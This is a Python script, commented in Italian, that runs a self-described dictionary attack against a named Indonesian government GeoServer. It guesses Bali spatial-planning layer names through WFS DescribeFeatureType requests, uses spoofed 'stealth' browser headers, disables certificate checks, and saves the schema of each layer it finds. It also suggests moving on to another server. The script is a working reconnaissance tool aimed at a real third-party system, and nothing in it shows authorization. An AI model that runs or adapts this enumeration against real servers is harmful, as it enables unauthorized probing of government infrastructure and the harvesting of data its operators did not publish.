import requests
import itertools
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURAZIONE ---
TARGET_URL = "https://atlas.atrbpn.go.id/geoserver/ows"

# --- GENERATORE DI NOMI (DICTIONARY) ---
# Costruiamo tutte le combinazioni possibili che un burocrate potrebbe usare
PREFIXES = ["geonode:", ""]
CORE_NAMES = ["bali", "badung", "sarbagita", "denpasar"] # Sarbagita = Denpasar+Badung+Gianyar+Tabanan
TYPES = ["rtrw", "rdtr", "pola_ruang", "struktur_ruang", "zonasi", "zoning", "landuse"]
YEARS = ["", "_2020", "_2021", "_2022", "_2023", "_2024", "_2025", "_revisi"]

def generate_guesses():
    guesses = []
    # Combina: geonode: + rtrw + _ + bali + _2024
    for p in PREFIXES:
        for t in TYPES:
            for c in CORE_NAMES:
                for y in YEARS:
                    # Varianti comuni
                    guesses.append(f"{p}{t}_{c}{y}") # geonode:rtrw_bali_2024
                    guesses.append(f"{p}{c}_{t}{y}") # geonode:bali_rtrw_2024
                    guesses.append(f"{p}{t}{c}{y}")  # geonode:rtrwbali2024
    return guesses

def hunt_layers():
    print("--- 🏹 OPERATION LAYER HUNTER (DICTIONARY ATTACK) ---")
    print(f"🎯 Bersaglio: {TARGET_URL}")
    
    guesses = generate_guesses()
    print(f"📋 Caricamento {len(guesses)} proiettili nel caricatore...")
    
    hits = []
    
    # Headers stealth
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }

    # Sessione per velocità
    session = requests.Session()
    session.verify = False
    
    for i, layer_name in enumerate(guesses):
        # Progress bar semplice
        if i % 10 == 0:
            print(f"   Testing {i}/{len(guesses)}... ({layer_name})", end="\r")
            
        # Chiediamo: "Descrivimi questo layer"
        params = {
            "service": "WFS",
            "version": "1.0.0",
            "request": "DescribeFeatureType",
            "typeName": layer_name
        }
        
        try:
            resp = session.get(TARGET_URL, params=params, headers=headers, timeout=5)
            
            # Se il layer ESISTE, risponde con XML Schema (200 OK e content-type xml)
            # Se NON ESISTE, risponde con ServiceException (spesso 200 OK ma XML di errore)
            
            if resp.status_code == 200:
                if "element name=" in resp.text and "ServiceException" not in resp.text:
                    print(f"\n   🔥 HIT CONFERMATO! -> {layer_name}")
                    hits.append(layer_name)
                    # Salviamo subito lo schema
                    with open(f"schema_{layer_name.replace(':','_')}.xml", "w") as f:
                        f.write(resp.text)
        except Exception as e:
            pass # Ignora timeout, vai avanti veloce

    print("\n\n--- 🏁 RAPPORTO CACCIA ---")
    if hits:
        print(f"✅ Trovati {len(hits)} Layer Nascosti:")
        for h in hits:
            print(f"   💎 {h}")
    else:
        print("❌ Nessun layer nascosto trovato con questo dizionario su Atlas.")
        print("   Consiglio: Il bersaglio potrebbe essere un altro server (Gistaru).")

if __name__ == "__main__":
    hunt_layers()
